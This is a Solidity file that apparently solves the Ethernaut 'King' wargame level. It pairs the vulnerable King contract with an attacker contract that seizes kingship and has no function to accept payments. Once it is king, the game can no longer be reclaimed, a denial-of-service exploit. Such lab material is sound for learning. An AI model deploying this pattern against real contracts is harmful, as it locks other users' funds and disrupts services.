// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Atk_King {
    address public owner;
    uint public amount;
    address public target;

    constructor(address addr) payable {
        owner = msg.sender;
        target = addr;
    }

    function set_target(address addr) public {
        target = addr;
    }

    function get_prize() public view returns(uint){
        uint prize = King(payable(target)).prize();
        return prize;
    }

    function withdraw() public {
        (bool sent,) = owner.call{value:address(this).balance}("");
    }

    function add_fund() payable public {
        amount = address(this).balance;
    }

    function atk(uint prize) public {
        (bool sent,) = target.call{value:prize}("");
    }


}
